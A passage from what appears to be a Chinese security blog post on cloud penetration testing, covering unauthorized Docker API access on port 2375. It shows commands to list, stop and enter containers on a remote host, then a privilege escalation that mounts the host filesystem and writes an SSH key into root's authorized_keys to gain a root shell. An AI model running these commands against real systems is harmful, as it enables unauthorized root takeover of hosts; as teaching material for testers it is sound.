+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/27.png"
+	width="1651"
+	height="761"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/27_hu_6e9b2b01495f73ad.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/27_hu_1abcc5822aa66a96.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="520px"
+	
+></p>
+<h3 id="514docker连接未授权端口">5.1.4.Docker连接未授权端口
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//ip:2375 ps -a</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/28.png"
+	width="1392"
+	height="246"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/28_hu_a0ac031f4c4a83f2.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/28_hu_19f3a95966322a3c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="565"
+		data-flex-basis="1358px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//ip:2375 images       查看镜像</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//1.1.1.1 stop d192a8dee160   #停止一个已经开启的容器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="p">.</span><span class="na">1</span><span class="p">.</span><span class="na">1</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">3d1c2eaa9df8</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">  </span><span class="err">#</span><span class="n">连接一个容器</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/29.png"
+	width="1248"
+	height="292"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/29_hu_2e21d73b91a74f4c.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/29_hu_565868d2adabd534.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="427"
+		data-flex-basis="1025px"
+	
+></p>
+<h3 id="515写公钥getshell">5.1.5.写公钥GetShell
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">rsa</span><span class="w">           </span><span class="err">#</span><span class="n">生成公钥</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/30.png"
+	width="1005"
+	height="499"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/30_hu_690dd16ec247c6ea.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/30_hu_4a55f2764f0d58d7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="483px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="na">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="na">pub</span><span class="w">     </span><span class="err">#</span><span class="n">查看生成的公钥</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/31.png"
+	width="1286"
+	height="131"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/31_hu_cad3ef63b52601a6.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/31_hu_9a7b58a3e984c83.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="981"
+		data-flex-basis="2356px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">挂载宿主机的</span><span class="o">/</span><span class="n">mnt目录写入公钥</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//1.1.1.1 run -it -v /:/mnt --entrypoint /bin/bash [images name]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2oUPAuPkNYqvVTALPCfUDxX5yEgBsaV1s+A3Jyk83CJxWwS7e327gvtIPO1VGY4QHpZMLAoi5SdO4Ru9Wm8E2ZojVTyb5pHTDZf1XizXXCakO39u5mT0ET/rwga5NVllp2ApdL4sL9wBihvHi1dlDTBUQvArpRPgKSnrBSPSADIBc4o6GSEBU6EUJMV5rtqNexQq53636ZiLjpLLEjJBsYXDpRU46mxQJjm/LqCENHdqVsvgoGXBqcDWjGqv59yn2KqgKKPs= root@admin&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="na">ssh</span><span class="o">/</span><span class="n">authorized_keys</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">连接目标主机获取shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ssh</span><span class="w"> </span><span class="n">root</span><span class="nd">@1.1.1.1</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="52docker容器逃逸漏洞">5.2.Docker容器逃逸漏洞
+</h2><p><a class="link" href="https://blog.csdn.net/qq_42383069/article/details/124634135"  target="_blank" rel="noopener"
+    >Docker API 未授权访问漏洞_dockerapi未授权访问漏洞-CSDN博客</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Sep 17, 2025 13:53 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/jsrpc%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/jsrpc%E5%AD%A6%E4%B9%A0/logo.4998b054f7e9bad9a9ac6ae767245e56_hu_a1ea4ca8cd072b24.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post JSRPC学习"
+                        
+                        data-hash="md5-SZiwVPfputmprGrnZyReVg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JSRPC学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/logo.58e5bcb0bd3d1324eccad2c3f1e6533d_hu_30f56b4785c67b3c.jpeg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 浏览器调试基础"
+                        
+                        data-hash="md5-WOW8sL09EyTsytLD8eZTPQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">浏览器调试基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/logo.eaf9caf191c430d0e5613ac24de20504_hu_e2b29ff36e7d23e5.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 文件上传漏洞"
+                        
+                        data-hash="md5-6vnK8ZHEMNDlYTrCTeIFBA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">文件上传漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/logo.fd9d587fa1464342546a9f891e7dd9ee_hu_3f91cd29d18e2a23.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post XML外部实体注入漏洞"
+                        
+                        data-hash="md5-/Z1Yf6FGQ0JUap&#43;JHn3Z7g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XML外部实体注入漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ssrf/ssrf.82f4b7d8f1ed0a0c59082752f949fe0c_hu_b02e966e9b7304c4.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post SSRF"
+                        
+                        data-hash="md5-gvS32PHtCgxZCCdS&#43;Un&#43;DA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSRF</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
